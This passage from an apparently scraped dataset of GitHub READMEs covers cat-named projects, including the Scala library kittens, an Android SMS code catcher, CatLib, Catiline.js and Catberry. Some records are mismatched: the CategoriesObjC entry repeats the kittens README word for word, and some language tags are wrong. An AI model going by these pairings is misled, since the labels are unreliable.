text\n            //then you can send verification code to server\n        }\n    });\nOverride activity lifecicle methods:\n    @Override\n    protected void onStart() {\n        super.onStart();\n        smsVerifyCatcher.onStart();\n    }\n\n    @Override\n    protected void onStop() {\n        super.onStop();\n        smsVerifyCatcher.onStop();\n    }\n\n    /**\n     * need for Android 6 real time permissions\n     */\n    @Override\n    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {\n        super.onRequestPermissionsResult(requestCode, permissions, grantResults);\n        smsVerifyCatcher.onRequestPermissionsResult(requestCode, permissions, grantResults);\n    }\nYou can set phone number filter:\n    smsVerifyCatcher.setPhoneNumberFilter(\"777\");\nor set message filter via regexp:\n   smsVerifyCatcher.setFilter(\"<regexp>\");\nThat's all!\nTake a look at the sample project for more information\nLicense\nCopyright 2017 stfalcon.com\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."}, {"title": "typelevel/kittens", "language": "Scala", "content": "kittens: automatic type class derivation for Cats and generic utility functions\nkittens is a Scala library which provides instances of type classes from the Cats library for arbitrary\nalgebraic data types using shapeless-based automatic type class derivation. It also provides some utility functions related to cats.Applicative such as lift, traverse and sequence to HList, Record and arbitrary parameter list.\n\nkittens is part of the Typelevel family of projects. It is an Open Source project under the Apache\nLicense v2, hosted on github. Binary artefacts will be published to the Sonatype OSS Repository Hosting\nservice and synced to Maven Central.\nIt is available for Scala 2.11 and 2.12, and Scala.js.\nTo get started with SBT, simply add the following to your build.sbt file:\nlibraryDependencies += \"org.typelevel\" %% \"kittens\" % \"1.2.1\"\n\n\n\nInstances derivations are available for the following type classes:\n\nEq\nPartialOrder\nOrder\nHash\nFunctor\nFoldable\nTraverse\nShow\nMonoid and MonoidK\nSemigroup and SemigroupK\nEmpty (defined in Alleycats)\n\nAuto derived Examples\nscala> import cats.implicits._, cats._, cats.derived._\n\nscala> case class Cat[Food](food: Food, foods: List[Food])\ndefined class Cat\n\nscala> val cat = Cat(1, List(2, 3))\ncat: Cat[Int] = Cat(1,List(2, 3))\n\nDerive Functor\nscala> implicit val fc: Functor[Cat] = { \n          import auto.functor._           \n          semi.functor }\nFC: cats.Functor[Cat] = cats.derived.MkFunctor2$$anon$4@1c60573f\n\nscala> cat.map(_ + 1)\nres0: Cat[Int] = Cat(2,List(3, 4))\nDerive Show\nNote that this Show also print out field names, so its results might be more preferable than the default toString.\nscala> case class Address(street: String, city: String, state: String)\nscala> case class ContactInfo(phoneNumber: String, address: Address)\nscala> case class People(name: String, contactInfo: ContactInfo)\n\nscala> val mike = People(\"Mike\", ContactInfo(\"202-295-3928\", Address(\"1 Main ST\", \"Chicago\", \"IL\")))\n\n\nscala> //existing Show instance for Address\nscala> implicit val addressShow: Show[Address] = new Show[Address] {\n          def show(a: Address) = s\"${a.street}, ${a.city}, ${a.state}\" \n       }\n\nscala> implicit val peopleShow: Show[People] = {\n            import auto.show._\n            semi.show\n        } //auto derive Show for People\n\nscala> mike.show\nres0: String = People(name = Mike, contactInfo = ContactInfo(phoneNumber = 202-295-3928, address = 1 Main ST, Chicago, IL))\n\nNote that in this example, the derivation auto derived all referenced class but still respect the existing instance in scope. For fully auto derivation please see the three modes of derivation below.\nSequence examples\nNote that to run these examples you need partial unification enabled on scalac. For Scala 2.11.9 or later you should add the following to your build.sbt:\nscalacOptions += \"-Ypartial-unification\"\nscala> import cats.implicits._, cats.sequence._\nimport cats.implicits._\nimport cats.sequence._\n\nscala> val f1 = (_: String).length\nf1: String => Int = <function1>\n\nscala> val f2 = (_: String).reverse\nf2: String => String = <function1>\n\nscala> val f3 = (_: String).toFloat\nf3: String => Double = <function1>\n\nscala> val f = sequence(f1, f2, f3)\nf: String => shapeless.::[Int,shapeless.::[String,shapeless.::[Float,shapeless.HNil]]] = <function1>\n\nscala> f(\"42.0\")\nres0: shapeless.::[Int,shapeless.::[String,shapeless.::[Float,shapeless.HNil]]] = 4 :: 0.24 :: 42.0 :: HNil\n\n//or generic over ADTs\nscala>  case class MyCase(a: Int, b: String, c: Float)\ndefined class MyCase\n\nscala>  val myGen = sequenceGeneric[MyCase]\nmyGen: cats.sequence.sequenceGen[MyCase] = cats.sequence.SequenceOps$sequenceGen@63ae3243\n\nscala> val f = myGen(a = f1, b = f2, c = f3)\nf: String => MyCase = <function1>\n\nscala> f(\"42.0\")\nres1: MyCase = MyCase(4,0.24,42.0)\n\nTraverse works similarly but you need a Poly.\nLift examples\nscala> import cats._, implicits._, lift._\nimport cats._\nimport implicits._\nimport lift._\n\nscala> def foo(x: Int, y: String, z: Float) = s\"$x - $y - $z\"\n\nscala> val lifted = Applicative[Option].liftA(foo _)\nlifted: (Option[Int], Option[String], Option[Float]) => Option[String] = <function3>\n\nscala> lifted(Some(1), Some(\"a\"), Some(3.2f))\nres0: Option[String] = Some(1 - a - 3.2)\n\nThree Modes of Derivation\nKittens provides three objects for derivation cats.derived.auto, cats.derived.cached and cats.derived.semi\nThe recommended best practice is going to be a semi auto one:\nimport cats.derived\n\nimplicit val showFoo: Show[Foo] = {\n   import derived.auto.show._\n   derived.semi.show\n}\nThis will respect all existing instances even if the field is a type constructor. For example Show[List[A]] will use the native Show instance for List and derived instance for A. And it manually caches the result to the val showFoo. Downside user will need to write one for every type they directly need a Show instance\nThere are 3 alternatives:\n\nfull auto:\n\nimport derived.auto.show._\nThe downside is that it will re-derive for every use site, which multiples the compilation time cost.\n\nfull auto cached\n\nimport derived.cached.show._\nUse this one with caution. It caches the derived instance globally. So it's only applicable if the instance is global in the application. This could be problematic for libraries, which has no control over the uniqueness of an instance on use site. It relies on shapeless.Cached which is buggy. Mile Sabin is working on a language level mechanism for instance sharing.\n\nmanual semi\n\nimplicit val showFoo: Show[Foo] =  derived.semi.show\nIt has the same downside as the recommenced semi-auto practice but also suffers from the type constructor field issue. I.e. if a field type is a type constructor whose native instance relies on the instance of the parameter type, this approach will by default derive an instance for the type constructor one. To overcome this user have to first derive the instance for type parameter.\ne.g.  given\ncase class Foo(bars: List[Bar])\ncase class Bar(a: String)\nSince the bars field of Foo is a List of Bar which breaks the chains of auto derivation, you will need to derive Bar first and then Foo\nimplicit val showBar: Show[Bar] =  semi.show\nimplicit val showFoo: Show[Foo] =  semi.show\nThis way the native instance for Show[List] would be used.\nkittens and Typelevel Scala\nTypelevel Scala provides a partial fix for SI-7046 which can present obstacles to the uses of\nshapeless's Generic and LabelledGeneric for the sealed trait at the root of an ADT such as you find in Kittens. If\nit appears that these two type classes are unable to find (all of) the subclasses of an ADT root trait then please try\nusing Typelevel Scala and see if it resolves the issue.\nTo use Typelevel Scala you should,\n\n\nUpdate your project/build.properties to require SBT 0.13.13 or later,\nsbt.version=0.13.13\n\n\n\nAdd the following to your build.sbt immediately next to where you set scalaVersion,\nscalaOrganization := \"org.typelevel\"\n\n\n\nIf this does resolve the problem, please lend your support to the pull request being merged in Lightbend\nScala.\nParticipation\nThe Kittens project supports the Scala code of conduct and wants all of its\nchannels (mailing list, Gitter, github, etc.) to be welcoming environments for everyone.\nBuilding kittens\nkittens is built with SBT 0.13.9 or later, and its master branch is built with Scala 2.11.7 by default.\nContributors\n\nCody Allen ceedubs@gmail.com @fourierstrick\nGeorgi Krastev joro.kr.21@gmail.com @Joro_Kr\nFabio Labella fabio.labella2@gmail.com @SystemFw\nMiles Sabin miles@milessabin.com @milessabin\nQi Wang Qi77Qi\nKailuo Wang kailuo.wang@gmail.com @kailuowang\nYour name here :-)"}, {"title": "jerrykrinock/CategoriesObjC", "language": "Objective-C", "content": "kittens: automatic type class derivation for Cats and generic utility functions\nkittens is a Scala library which provides instances of type classes from the Cats library for arbitrary\nalgebraic data types using shapeless-based automatic type class derivation. It also provides some utility functions related to cats.Applicative such as lift, traverse and sequence to HList, Record and arbitrary parameter list.\n\nkittens is part of the Typelevel family of projects. It is an Open Source project under the Apache\nLicense v2, hosted on github. Binary artefacts will be published to the Sonatype OSS Repository Hosting\nservice and synced to Maven Central.\nIt is available for Scala 2.11 and 2.12, and Scala.js.\nTo get started with SBT, simply add the following to your build.sbt file:\nlibraryDependencies += \"org.typelevel\" %% \"kittens\" % \"1.2.1\"\n\n\n\nInstances derivations are available for the following type classes:\n\nEq\nPartialOrder\nOrder\nHash\nFunctor\nFoldable\nTraverse\nShow\nMonoid and MonoidK\nSemigroup and SemigroupK\nEmpty (defined in Alleycats)\n\nAuto derived Examples\nscala> import cats.implicits._, cats._, cats.derived._\n\nscala> case class Cat[Food](food: Food, foods: List[Food])\ndefined class Cat\n\nscala> val cat = Cat(1, List(2, 3))\ncat: Cat[Int] = Cat(1,List(2, 3))\n\nDerive Functor\nscala> implicit val fc: Functor[Cat] = { \n          import auto.functor._           \n          semi.functor }\nFC: cats.Functor[Cat] = cats.derived.MkFunctor2$$anon$4@1c60573f\n\nscala> cat.map(_ + 1)\nres0: Cat[Int] = Cat(2,List(3, 4))\nDerive Show\nNote that this Show also print out field names, so its results might be more preferable than the default toString.\nscala> case class Address(street: String, city: String, state: String)\nscala> case class ContactInfo(phoneNumber: String, address: Address)\nscala> case class People(name: String, contactInfo: ContactInfo)\n\nscala> val mike = People(\"Mike\", ContactInfo(\"202-295-3928\", Address(\"1 Main ST\", \"Chicago\", \"IL\")))\n\n\nscala> //existing Show instance for Address\nscala> implicit val addressShow: Show[Address] = new Show[Address] {\n          def show(a: Address) = s\"${a.street}, ${a.city}, ${a.state}\" \n       }\n\nscala> implicit val peopleShow: Show[People] = {\n            import auto.show._\n            semi.show\n        } //auto derive Show for People\n\nscala> mike.show\nres0: String = People(name = Mike, contactInfo = ContactInfo(phoneNumber = 202-295-3928, address = 1 Main ST, Chicago, IL))\n\nNote that in this example, the derivation auto derived all referenced class but still respect the existing instance in scope. For fully auto derivation please see the three modes of derivation below.\nSequence examples\nNote that to run these examples you need partial unification enabled on scalac. For Scala 2.11.9 or later you should add the following to your build.sbt:\nscalacOptions += \"-Ypartial-unification\"\nscala> import cats.implicits._, cats.sequence._\nimport cats.implicits._\nimport cats.sequence._\n\nscala> val f1 = (_: String).length\nf1: String => Int = <function1>\n\nscala> val f2 = (_: String).reverse\nf2: String => String = <function1>\n\nscala> val f3 = (_: String).toFloat\nf3: String => Double = <function1>\n\nscala> val f = sequence(f1, f2, f3)\nf: String => shapeless.::[Int,shapeless.::[String,shapeless.::[Float,shapeless.HNil]]] = <function1>\n\nscala> f(\"42.0\")\nres0: shapeless.::[Int,shapeless.::[String,shapeless.::[Float,shapeless.HNil]]] = 4 :: 0.24 :: 42.0 :: HNil\n\n//or generic over ADTs\nscala>  case class MyCase(a: Int, b: String, c: Float)\ndefined class MyCase\n\nscala>  val myGen = sequenceGeneric[MyCase]\nmyGen: cats.sequence.sequenceGen[MyCase] = cats.sequence.SequenceOps$sequenceGen@63ae3243\n\nscala> val f = myGen(a = f1, b = f2, c = f3)\nf: String => MyCase = <function1>\n\nscala> f(\"42.0\")\nres1: MyCase = MyCase(4,0.24,42.0)\n\nTraverse works similarly but you need a Poly.\nLift examples\nscala> import cats._, implicits._, lift._\nimport cats._\nimport implicits._\nimport lift._\n\nscala> def foo(x: Int, y: String, z: Float) = s\"$x - $y - $z\"\n\nscala> val lifted = Applicative[Option].liftA(foo _)\nlifted: (Option[Int], Option[String], Option[Float]) => Option[String] = <function3>\n\nscala> lifted(Some(1), Some(\"a\"), Some(3.2f))\nres0: Option[String] = Some(1 - a - 3.2)\n\nThree Modes of Derivation\nKittens provides three objects for derivation cats.derived.auto, cats.derived.cached and cats.derived.semi\nThe recommended best practice is going to be a semi auto one:\nimport cats.derived\n\nimplicit val showFoo: Show[Foo] = {\n   import derived.auto.show._\n   derived.semi.show\n}\nThis will respect all existing instances even if the field is a type constructor. For example Show[List[A]] will use the native Show instance for List and derived instance for A. And it manually caches the result to the val showFoo. Downside user will need to write one for every type they directly need a Show instance\nThere are 3 alternatives:\n\nfull auto:\n\nimport derived.auto.show._\nThe downside is that it will re-derive for every use site, which multiples the compilation time cost.\n\nfull auto cached\n\nimport derived.cached.show._\nUse this one with caution. It caches the derived instance globally. So it's only applicable if the instance is global in the application. This could be problematic for libraries, which has no control over the uniqueness of an instance on use site. It relies on shapeless.Cached which is buggy. Mile Sabin is working on a language level mechanism for instance sharing.\n\nmanual semi\n\nimplicit val showFoo: Show[Foo] =  derived.semi.show\nIt has the same downside as the recommenced semi-auto practice but also suffers from the type constructor field issue. I.e. if a field type is a type constructor whose native instance relies on the instance of the parameter type, this approach will by default derive an instance for the type constructor one. To overcome this user have to first derive the instance for type parameter.\ne.g.  given\ncase class Foo(bars: List[Bar])\ncase class Bar(a: String)\nSince the bars field of Foo is a List of Bar which breaks the chains of auto derivation, you will need to derive Bar first and then Foo\nimplicit val showBar: Show[Bar] =  semi.show\nimplicit val showFoo: Show[Foo] =  semi.show\nThis way the native instance for Show[List] would be used.\nkittens and Typelevel Scala\nTypelevel Scala provides a partial fix for SI-7046 which can present obstacles to the uses of\nshapeless's Generic and LabelledGeneric for the sealed trait at the root of an ADT such as you find in Kittens. If\nit appears that these two type classes are unable to find (all of) the subclasses of an ADT root trait then please try\nusing Typelevel Scala and see if it resolves the issue.\nTo use Typelevel Scala you should,\n\n\nUpdate your project/build.properties to require SBT 0.13.13 or later,\nsbt.version=0.13.13\n\n\n\nAdd the following to your build.sbt immediately next to where you set scalaVersion,\nscalaOrganization := \"org.typelevel\"\n\n\n\nIf this does resolve the problem, please lend your support to the pull request being merged in Lightbend\nScala.\nParticipation\nThe Kittens project supports the Scala code of conduct and wants all of its\nchannels (mailing list, Gitter, github, etc.) to be welcoming environments for everyone.\nBuilding kittens\nkittens is built with SBT 0.13.9 or later, and its master branch is built with Scala 2.11.7 by default.\nContributors\n\nCody Allen ceedubs@gmail.com @fourierstrick\nGeorgi Krastev joro.kr.21@gmail.com @Joro_Kr\nFabio Labella fabio.labella2@gmail.com @SystemFw\nMiles Sabin miles@milessabin.com @milessabin\nQi Wang Qi77Qi\nKailuo Wang kailuo.wang@gmail.com @kailuowang\nYour name here :-)"}, {"title": "cemolcay/CategorySliderView", "language": "Objective-C", "content": "CategorySliderView\nHorizontal or vertical slider view for choosing categories. Add any UIView type as category item view. Fully customisable\nDemo\n\nInstall\nManual\nCopy CategorySliderView.h/m files into your project.\nCocoaPods\n    source 'https://github.com/CocoaPods/Specs.git'\n    pod 'CategorySliderView', '~> 1.0.2'\n\nUsage\nUILabel *category1 = ......\nUILabel *category2 = ......\nUILabel *category3 = ......\n...\n\nCategorySliderView *sliderView = [[CategorySliderView alloc] initWithSliderHeight:60 andCategoryViews:@[category1, category2, category3] categorySelectionBlock:^(UIView *categoryView, NSInteger categoryIndex) {\n    UILabel *selectedView = (UILabel *)categoryView;\n    NSLog(@\"\\\"%@\\\" cateogry selected at index %d\", selectedView.text, categoryIndex);\n}];\n[self.view addSubview:sliderView];\n\nyou can add as many items as you want\nUIView *newCategoryView = .....\n[sliderView addCategoryView:newCategoryView];\n\nOptional Properties\nshouldAutoScrollSlider: scrolls to closest category item after dragging ends\nshouldAutoSelectScrolledCategory: selects the closest category item after dragging ends\ncategoryViewPadding: padding between category item views\nbackgroundImage: background image for slider"}, {"title": "X-Wei/flutter_catalog", "language": "Dart", "content": "Flutter Catalog\n\n\n\n\n\n\n\n\n\nAn app showcasing Flutter components, with side-by-side source code view.\nScreenshots\n\n\n\n\n\n\nHow to contribute by adding a new example page\n\nCreate a dart file under lib/route/ (or just duplicate a file, e.g. cp widgets_icon_ex.dart new_example.dart);\nIn the new file, create a class that extends MyRoute;\nAdd const constructor, the convention is to use the file path as constructor's default parameter;\n(Optional) override getters: title, description, links;\nOverride buildMyRouteContent(), try to make the code simple, as it'll be shown on phone screens;\nOpen lib/my_app_meta.dart, import the new file at the beginning of file;\nIn kMyAppRoutesStructure, add an instantiation of the new class under the appropriate item group.\n\nCredits\nThis app is written with reference to many resources, including:\n\nOffical gallery app: https://github.com/flutter/flutter/tree/master/examples/flutter_gallery\nAndrea Bizzotto's YouTube channel: https://www.youtube.com/channel/UCrTnsT4OYZ53l0QGKqLeD5Q\nTensor Programming's YouTube channel: https://www.youtube.com/watch?v=WwhyaqNtNQY&list=PLJbE2Yu2zumDqr_-hqpAN0nIr6m14TAsd\nEajy's flutter demo: https://github.com/Eajy/flutter_demo"}, {"title": "CatLib/CatLib", "language": "C#", "content": "English version is coming soon in version 2.0\n\n\n\u4e86\u89e3 CatLib/Core \u6e90\u7801\n\n\u5173\u4e8eCatLib for Unity\nCatLib for Unity \u662f\u4e3aUnity3D\u5f00\u53d1\u7684\u670d\u52a1\u63d0\u4f9b\u8005\u6846\u67b6\uff0c\u8fd9\u4e2a\u6846\u67b6\u5bf9\u4e8e\u4e00\u4e9b\u529f\u80fd\u6027\u4e1a\u52a1\u7684\u7814\u53d1\u975e\u5e38\u6709\u5e2e\u52a9\uff0c\u6211\u4eec\u8fd8\u901a\u8fc7\u96c6\u6210\u5e38\u89c1\u7684\u5f00\u53d1\u7ec4\u4ef6\u6765\u51cf\u5c11\u5f00\u53d1\u8005\u4eec\u4e0d\u5fc5\u8981\u7684\u5de5\u4f5c\u3002\nCatLib\u63d0\u4f9b\u4e86\u6784\u5efa\u4e00\u4e2a\u6e38\u620f\u6240\u5fc5\u5907\u7684\u57fa\u7840\u7ec4\u4ef6 , \u60a8\u53ef\u4ee5\u901a\u8fc7\u63a5\u53e3\u7b80\u5355\u7684\u8c03\u7528\u5c31\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u7ec4\u4ef6\u7684\u7279\u6027. \u60a8\u4e5f\u53ef\u4ee5\u6839\u636e\u4e1a\u52a1\u9700\u6c42\u81ea\u7531\u7ec4\u5408\u642d\u914d\uff0c\u5168\u65b0\u6784\u5efa\u8fd9\u4e9b\u7ec4\u4ef6\uff0c\u6765\u6784\u5efa\u4e00\u4e2a\u5b8c\u6574\u7684\u9879\u76ee\u3002\n\u65e0\u8bba\u60a8\u662f\u4e00\u4e2a\u65b0\u7684\u9879\u76ee\u8fd8\u662f\u4e00\u4e2a\u6b63\u5728\u88ab\u5f00\u53d1\u7684\u9879\u76ee\uff0c\u60a8\u90fd\u53ef\u4ee5\u8f7b\u677e\u7684\u5d4c\u5165CatLib\u3002\u7edd\u5927\u591a\u6570\u7684CatLib\u7684\u7ec4\u4ef6\u90fd\u53ef\u4ee5\u88ab\u5355\u72ec\u4f7f\u7528\u548c\u65e0\u611f\u77e5\u66ff\u6362\u7684\uff0c\u6211\u4eec\u4e5f\u6b22\u8fce\u5176\u4ed6\u7684\u6846\u67b6\u5f00\u53d1\u8005\u6765\u4f7f\u7528\u8fd9\u4e9b\u7ec4\u4ef6\u3002\n\u5feb\u901f\u5f00\u59cb\n\n\u4e0b\u8f7d\u5e76\u89e3\u538bunitypackage\u5230unity\u9879\u76ee\u3002\n\u5b89\u88c5CatLib/Example\u4e0b\u7684\u793a\u4f8b\u9879\u76ee\uff0c\u5e76\u5728\u573a\u666f\u4e2d\u521b\u5efa\u4e00\u4e2aGameObject\u3002\n\u5c06Demo/Runtime/Main.cs\u5165\u53e3\u6587\u4ef6\u62d6\u62fd\u5230GameObject\u4e0a\u3002\n\u8fd0\u884c\u60a8\u7684unity\u573a\u666f\uff0c\u60a8\u5c06\u4f1a\u770b\u5230\u63a7\u5236\u53f0\u8f93\u51fa\u6b22\u8fce\u5b57\u7b26\u4e32\uff1aHello CatLib\u3002\n\u606d\u559c\u60a8\uff0c\u6846\u67b6\u5df2\u7ecf\u6b63\u786e\u5b89\u88c5\uff0c\u67e5\u770bCatLib/CHANGELOG.md\u4e86\u89e3\u53d8\u66f4\u8bb0\u5f55\u3002\n\n\u5b66\u4e60CatLib\nCatLib\u62e5\u6709\u5b8c\u6574\u7684\u6587\u6863\u652f\u6301\uff0c\u60a8\u53ef\u4ee5\u8bbf\u95ee CatLib\u6587\u6863 \u8fdb\u884c\u5b66\u4e60\u3002\n\u6216\u8005\u60a8\u4e5f\u53ef\u4ee5\u901a\u8fc7 issues \u6765\u63d0\u51fa\u60a8\u7684\u95ee\u9898\uff0c\u6211\u4eec\u53ca\u65f6\u4e3a\u60a8\u89e3\u7b54\u3002\n\u8d21\u732e\nCatLib\u8fd8\u662f\u4e00\u4e2a\u5e74\u8f7b\u7684\u6846\u67b6\uff0c\u5979\u7684\u6210\u957f\u548c\u4f60\u4eec\u7684\u8d21\u732e\u662f\u5206\u4e0d\u5f00\u7684\uff0c\u5982\u679c\u60a8\u60f3\u8981\u4e3a\u9879\u76ee\u8fdb\u884c\u8d21\u732e\u8bf7\u53c2\u8003\uff1a CatLib \u8d21\u732e\u6587\u6863 \u60a8\u7684\u8d21\u732e\u5c06\u4f1a\u88ab\u5217\u5165\u8d21\u732e\u8005\u540d\u5355\uff0c\u6211\u4eec\u6b22\u8fce\u4efb\u4f55\u5f62\u5f0f\u7684Pull Request!\nissues \u4e0d\u4ec5\u4ec5\u53ea\u662f\u7528\u4e8ebug\u8ddf\u8e2a , \u5982\u679c\u60a8\u6709\u597d\u7684\u610f\u89c1\u6216\u8005\u60f3\u6cd5\uff0c\u4e5f\u6b22\u8fce\u521b\u5efa issues \u4e00\u8d77\u8ba8\u8bba\u3002\n\u6388\u6743\nCatLib\u4f7f\u7528\u7684\u5f00\u6e90\u8bb8\u53ef\u662f\uff1aMIT license.\n\u6280\u672f\u652f\u6301\n\nQQ\u7fa4: 150371044 (\u9a8c\u8bc1: CatLib Support)\nemail: support@catlib.io\nslack: catlib.slack"}, {"title": "calvinmetcalf/catiline", "language": "JavaScript", "content": "Catiline.js is a JavaScript library all about workers. Workers should make your life easier, not harder, and with Catiline.js launching a new worker is as simple as calling a function. It works the same across all (modern) browsers. Formerly known as Communist.js, Catiline.js is the same great library with a less controversial name.\nHow easy is it? var worker = cw(myFunc) creates a worker. Send it data with var response = worker.data(YOUR DATA);, and the response is a promise. It's that easy. For more in-depth usage, checkout the examples bellow or the\nAPI page.\nWant to use it? Grab the\ndevelopment version\nor production version from the dist folder.\nFor usage in addition to the API page and documentation, I wrote a blog post about Catiline.js (under its old name). Or, you can browse some demos:\n\nParsing a dictionary\nFractal Map, (April Mozilla Dev Derby Finalist)\nRTree Bounding Boxes\nCensus Visualization\nVector Map Tiles\nUnzipping files and reprojecting maps\n\nUpdates and changes are all in the changelog.\nThere is also a plugin list.\nImportant: the file catiline.js or catiline.min.js should be a standalone file hosted on the same domain as your web page. If you can't, or need to bundle catiline but you need it to work on IE10, Opera, and Safari, you have to host the file \"SHIM_WORKER.js\" on the same domain as the html file\nand set the path to it in a global variable SHIM_WORKER_PATH before you load catiline.\nThis grew out of my work with earlier versions\nof this library and my differences in opinion with\nParallel.js's direction. There is\nalso a library doing very similar things called operative."}, {"title": "konifar/material-cat", "language": "Kotlin", "content": "Material Cat\nCat photos app for Material Design Animation tranining.\n\n\n\nMaterial Animations\nRipple Effect\n\nResponsive interaction in Material Design Spec.\nCustomize Touch Feedback in Developer page.\n\n\nReveal Animation\n\nMeaningful Transitions in Material Design Spec.\nUse the Reveal Effect in Developer page.\n\n\nActivity Transition (Shared Element)\n\nMeaningful Transitions in Material Design Spec.\nCustomize Activity Transitions in Developer page.\n\n\nAnimated Vector Drawable\n\nDelightful details in Material Design Spec.\nAnimate Vector Drawables in Developer page.\n\n\nThanks\nThis app uses following Material design support libraries for pre-lollipop.\n\nCircularReveal\nNineOldAndroids\nmaterialish-progress\nfab-transformation\n\nDeveloped By\nYusuke Konishi (konifar) - yahpeycoy0403@gmail.com\nTwitter Account @konifar\nLicense\nThe MIT License (MIT)\n\nCopyright (c) 2015 Yusuke Konishi\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."}, {"title": "letiantian/another-tutorial-about-java-web", "language": "Kotlin", "content": "\u6d45\u5165\u6d45\u51faJava Web\nJSP & Servlet\n00-00\u3001\u5e8f\n00-01\u3001\u76f8\u5173\u8f6f\u4ef6\u7684\u5b89\u88c5\n00-02\u3001\u7406\u89e3HTTP\n00-03\u3001\u4eceJSP\u5f00\u59cb\n00-04\u3001\u7406\u89e3Servlet\n00-05\u3001\u8fc7\u6ee4\u5668\u4e0e\u76d1\u542c\u5668\n00-06\u3001\u4f7f\u7528velocity\u6a21\u677f\u5f15\u64ce\n00-07\u3001\u4f7f\u7528\u6570\u636e\u5e93\u8fde\u63a5\u6c60\n00-08\u3001Tomcat\u7684\u8fd0\u884c\u673a\u5236\nSpring MVC\n\u4f7f\u7528Spring 4.0 \u3002\n01-00\u3001Spring\u4e0e\u4f9d\u8d56\u6ce8\u5165\n01-01\u3001Spring\u4e0e\u9762\u5411\u5207\u9762\u7f16\u7a0b\n01-02\u3001\u4f7f\u7528Spring MVC\u6784\u5efaHello World\n01-03\u3001JdbcTemplate\n01-04\u3001\u57fa\u4e8e\u6ce8\u89e3\u7684URL\u6620\u5c04\n01-05\u3001JSON\n01-06\u3001\u6821\u9a8c\u5668\n01-07\u3001\u56fd\u9645\u5316\n01-08\u3001\u62e6\u622a\u5668\n01-09\u3001\u6587\u4ef6\u4e0a\u4f20\n01-10\u3001\u8f6c\u6362\u5668\u4e0e\u683c\u5f0f\u5316\nBook\nSpring MVC\u5b66\u4e60\u6307\u5357\nJSP\u5927\u5b66\u5b9e\u7528\u6559\u7a0b\nSpring MVC Beginner's Guide\n\u8f7b\u91cf\u7ea7Java EE\u4f01\u4e1a\u5e94\u7528\u5b9e\u6218\nOnline Tutorial\nJSP\u6559\u7a0b - \u83dc\u9e1f\u6559\u7a0b\nServlet\u6559\u7a0b - \u83dc\u9e1f\u6559\u7a0b\nSpring\u5b98\u65b9\u6587\u6863\uff1aSpring Framework Reference Documentation\nSpring MVC\u5b98\u65b9\u6587\u6863\uff1aIntroduction to Spring Web MVC framework\n\u8ddf\u5f00\u6d9b\u5b66spring mvc\nQ & A\nstackoverflow\n\u5f00\u6e90\u4e2d\u56fd\u793e\u533a-\u95ee\u7b54\nLearn More\nJetty\nNetty\nJUnit\nMaven\nGradle\nMyBatis\nHibernate\nAkka\nJUnit:\n\u6155\u8bfe\u7f51\uff1aJUnit\nMaven:\n\u6155\u8bfe\u7f51\uff1aMaven\nGradle:\nGradle User Guide\nGradle\u5165\u95e8\u7cfb\u5217\n\u4f7f\u7528Gradle\u6784\u5efaJava Web\u5e94\u7528\nSimple Gradle Web Application\nSupplement\n\u8865\u5145"}, {"title": "tpolecat/cats-infographic", "language": "Kotlin", "content": "Cats Infographic\nThis is version 1.2 for cats 1.3.0, cats-effect 1.0.0, and cats-mtl 0.2.3.\nThis is an OmniGraffle 7 diagram of the Cats typeclass hierarchy, shareable under the CC-BY-SA 4.0 license.\nThe .pdf export, suitable for framing or tattoo design, is probably what you want.\nThe .svg export below is embiggenable with a gentle click."}, {"title": "catberry/catberry", "language": "JavaScript", "content": "Catberry\n \n\n\n\n\nWhat the cat is that?\nCatberry was developed to help create \"isomorphic/Universal\" Web applications.\nLong story short, isomorphic/universal applications are apps that use the same codebase on both the server and client environments to render what the client would see as a \"Single Page Application\".\nTLDR;\nInstall Catberry CLI using following command:\nnpm install -g catberry-cli\nUse Catberry CLI to create an empty project with Handlebars support like this:\ncatberry init empty-handlebars\nOr an example application that works using GitHub API:\ncatberry init example\nAlso, you can get a list of all templates:\ncatberry init ?\nUseful links\n\nCatberry Documentation\nGet Started Guide\nPlugins and Tools\nCatberry's homepage and its source code\nTodo application\nExample application\n\nWhy should I use that?\nArchitecture\n\nThe entire architecture of the framework is built using the Service Locator pattern \u2013 which helps to manage module dependencies and create plugins \u2013 and Flux, for the data layer\nCat-components \u2013 similar to web-components but organized as directories, can be rendered on the server and published/installed as NPM packages\nCatberry builds a bundle for running the application in a browser as a Single Page Application\nES2015/ES6 support \u2013 native on the server/Node.js and using Babel for a browser\nThe whole framework's API uses Promises\nFramework itself is an express/connect middleware, which means you can use it with other middlewares\n\nRendering\n\nFast and efficient progressive rendering engine based on\nnode.js streams on the server\nBrowser rendering does not block the Event Loop, which means your app's UI will never be frozen\nHandlebars, Dust and\nPug template engines are officially supported (and you can implement your own provider to support any other)\nEfficient DOM event listening using event delegation\n\nFor more details please proceed to Catberry Documentation.\nTypical Cat-component example\n'use strict';\n\nclass CoolComponent {\n\n\t/**\n\t * Creates a new instance of the \"CoolComponent\" component.\n\t * @param {ServiceLocator} locator The service locator for resolving dependencies.\n\t */\n\tconstructor(locator) {\n\t\t// you can resolve any dependency from the locator.\n\t}\n\n\t/**\n\t * Gets data for the template.\n\t * This method is optional.\n\t * @returns 